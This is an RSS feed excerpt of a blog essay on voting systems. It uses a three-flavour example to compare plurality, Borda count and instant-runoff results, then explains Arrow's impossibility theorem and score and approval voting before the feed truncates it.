<p>This system does not truly determine the <em>'will of the people'</em>, unless.... there are only two candidates. One of the candidates is guaranteed to receive a majority, barring a tie. So if it were truly a <em>two-party system</em> some of the flaws of this system do not matter any more.</p>
<h2>Ranked Choice Voting</h2>
<p>Since the Plurality based system does not capture the full spectrum of the voter's preferences, we should probably ask for more information from the voters. What if we asked the voters to rank all the candidates, rather than cast a ballot for their favorite?</p>
<p>Let's look at the example we've been working with. We asked the 100 people to rank the candidate flavors. Here's the result:</p>
<table>
<thead>
<tr>
<th>1st</th>
<th>2nd</th>
<th>3rd</th>
<th>Votes</th>
</tr>
</thead>
<tbody>
<tr>
<td>Vanilla</td>
<td>Strawberry</td>
<td>Chocolate</td>
<td>45</td>
</tr>
<tr>
<td>Strawberry</td>
<td>Chocolate</td>
<td>Vanilla</td>
<td>15</td>
</tr>
<tr>
<td>Chocolate</td>
<td>Strawberry</td>
<td>Vanilla</td>
<td>30</td>
</tr>
<tr>
<td>Chocolate</td>
<td>Vanilla</td>
<td>Strawberry</td>
<td>10</td>
</tr>
</tbody>
</table>
<p>All of the 45 people who voted for Vanilla had Strawberry as the second choice. All 15 people who voted for Strawberry, had Chocolate as their second choice. Of the 40 people who voted for Chocolate, 30 preferred Strawberry over Vanilla, and 10 preferred Vanilla. So, which flavor won? There are multiple ways to interpret this data. Let's look at a couple 👇</p>
<h2>Borda Count</h2>
<p>In this system for <code>n</code> candidates, each first-place vote receives <code>n</code> points. Second-place receives <code>n-1</code> points, and so on. The candidate with the most points wins.</p>
<p>Let's compute the points in our example. Vanilla received 45 first places, 10 second places, and 45 third places. So the score for Vanilla is <code>45n + 10(n-1) + 45(n-2)</code>. Here, <code>n</code> is <code>3</code>, giving Vanilla a score of <code>200</code>. Here's the final tally:</p>
<table>
<thead>
<tr>
<th>Flavor</th>
<th>Points</th>
</tr>
</thead>
<tbody>
<tr>
<td>Vanilla</td>
<td>200</td>
</tr>
<tr>
<td>Chocolate</td>
<td>195</td>
</tr>
<tr>
<td>Strawberry</td>
<td>205</td>
</tr>
</tbody>
</table>
<p><strong>Strawberry has won!</strong> Strawberry, which had the fewest votes in the Plurality voting system, has the most points in the Borda ranking system. Totally ridiculous, isn't it? Well maybe, but maybe not. Strawberry did receive the fewest third-place votes. And 75% of the people had Strawberry as their second choice.  Perhaps Strawberry does deserve to win!</p>
<h2>Instant Runoff Voting</h2>
<p>Let's take a look at a different model of interpreting the ranked voting data. In an Instant Runoff, the candidate with the fewest first-place votes is eliminated, and its votes are distributed to the second choice. This is then repeated until we have one candidate left standing.</p>
<p>Some consider this model of iterative elimination a bit confusing and thereby not practical. But it's getting wide adoption, including in political elections (San Francisco and Oakland city elections, for example). It is also used to decide the winner of the Best Picture Academy Award.</p>
<p>Let's apply this to our current example.</p>
<table>
<thead>
<tr>
<th>Flavor</th>
<th>Votes</th>
</tr>
</thead>
<tbody>
<tr>
<td>Vanilla</td>
<td>45</td>
</tr>
<tr>
<td>Chocolate</td>
<td>40</td>
</tr>
<tr>
<td>Strawberry (eliminated)</td>
<td>15</td>
</tr>
</tbody>
</table>
<p>Strawberry is eliminated. Since all Strawberry voters preferred Chocolate over Vanilla, Chocolate gets Strawberry's 15 votes. Chocolate now has 55 votes, a majority. <strong>Chocolate has won!</strong></p>
<h2>Quick Recap</h2>
<p>We have discussed three systems so far, and in our example, we have had three different winners for the same election. You may decide subjectively that one of these systems may be better for the use case you have in mind, or you might think as I did at first: <strong>It's all pointless!</strong></p>
<h2>The Impossibility</h2>
<p>There is a concept in decision theory called the <strong><a href="https://en.wikipedia.org/wiki/Independence_of_irrelevant_alternatives">Independence of Irrelevant Alternatives (IIA)</a></strong> which states a voter's preference between two choices <code>x</code> and <code>y</code>, should not depend on any other choices.</p>
<p>This seems like a simple and a good rule to live by and our election systems should live by them as well. Sadly, all the systems we have looked at so far do not abide by this rule.</p>
<p>Let's look at the Plurality system - From the rankings we know that all of Strawberry voters prefer Chocolate over Vanilla. If the choice of Strawberry was not there, Chocolate would have won with 55 votes. But with Strawberry present, Vanilla wins with 45 votes.</p>
<p>For the Borda system, Chocolate is the spoiler. With Chocolate in the picture, Strawberry wins. Without Chocolate, Vanilla wins 55-45.</p>
<p>In the Instant Runoff, Chocolate wins when Vanilla is present but Strawberry wins 60-40 if Vanilla is not.</p>
<h3>Arrow's Impossibility Theorem</h3>
<p>In decision theory, here are some good things to have in an election or any voting system.</p>
<ul>
<li>Independence of Irrelevant Alternatives: which we have discussed and failed to account for so far.</li>
<li>Nondictatorship: Output should not be based on one individual, the wishes of multiple voters should be taken into consideration.</li>
<li>Pareto Efficiency (Unanimity): should have a notion of <a href="https://en.wikipedia.org/wiki/Pareto_efficiency">unanimity</a> — If every voter prefers candidate A over candidate B, candidate A should win.</li>
<li>Unrestricted Domain: Voting must account for all individual preferences.</li>
<li>Ordering:  Each individual should be able to order the choices in any way.</li>
</ul>
<p>All good rules, don't you think? Let's create the ultimate voting system! But here comes <a href="https://en.wikipedia.org/wiki/Kenneth_Arrow">Kenneth Arrow</a> to shatter our hopes.</p>
<p><strong><a href="https://en.wikipedia.org/wiki/Arrow's_impossibility_theorem">Arrow's Impossibility Theorem</a> states that in all cases where preferences are ranked, it is impossible to formulate a social ordering without violating one of these rules.</strong></p>
<p>In other words, any democracy that satisfies Unanimity and the Independence of Irrelevant Alternatives, must be a dictatorship! *<em>insert dramatic sound effects</em>*</p>
<p>So yeah, we will always find things to argue about in an election. 😒</p>
<h2>Dodging the Impossibility</h2>
<p>Since every system is flawed, is it the end of this essay? Unfortunately for you, I, like many of you, noticed this one clause in Arrow's impossibility theorem which provides a way for us to escape this gravity well.</p>
<p>The theorem assumes that we are dealing with a ranked choice voting system. Let's just not rank our candidates. 💡</p>
<p>Here I would remind you, that we're trying to look at voting systems in general, not just political elections.</p>
<p>We have implemented non rank based systems in Software numerous times. Think Netflix, Yelp, Reddit, Tinder. The key as you may have guessed is rating, and not ranking (Tinder being a more specific type of rating - approval voting, which I'll discuss later). A voting system based on rating is usually called <strong>Score Voting</strong>.</p>
<h2>Score Voting</h2>
<p>The idea behind score voting is that you give each candidate a score in one or many categories. This score is independent of the score the other candidates receive. Think Diving and Gymnastics in the Olympics. The judges rate each athlete based on form, routine, landings. One with the highest total score wins.</p>
<p>But is this system better? That's subjective but we know it lets us escape the impossibility mathematically, and yet conform to independence, unanimity and nondictatorship rules.</p>
<h2>Approval Voting</h2>
<p>There's a simpler form or Score Voting - Approval Voting. Think of it as a binary version of the score voting. Each person can give a candidate a score of <code>0</code> or <code>1</code>. In other words one can approve or disapprove any number of candidates.</p>
<p>This is similar to how people vote on dating apps like Tinder. They give prospects a score of <code>1</code> by swiping right, and a score of <code>0</code> by swiping left.</p>
<h2>Strategizing the Ranked Vote</h2>
<p>One key advantage for Score Voting and Approval Voting is that it never hurts to vote for your favorite candidate. It may seem obvious and trivial but it's not always satisfied by voting systems. For example, it is common in political elections for people to not vote for the third-party candidate even though the third-party candidate may be the voter's first …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://shihn.ca/posts/2020/voting-systems/">https://shihn.ca/posts/2020/voting-systems/</a></em></p>]]>
            </description>
            <link>https://shihn.ca/posts/2020/voting-systems/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25053892</guid>
            <pubDate>Wed, 11 Nov 2020 00:09:18 GMT</pubDate>
        </item>
    </channel>
</rss>
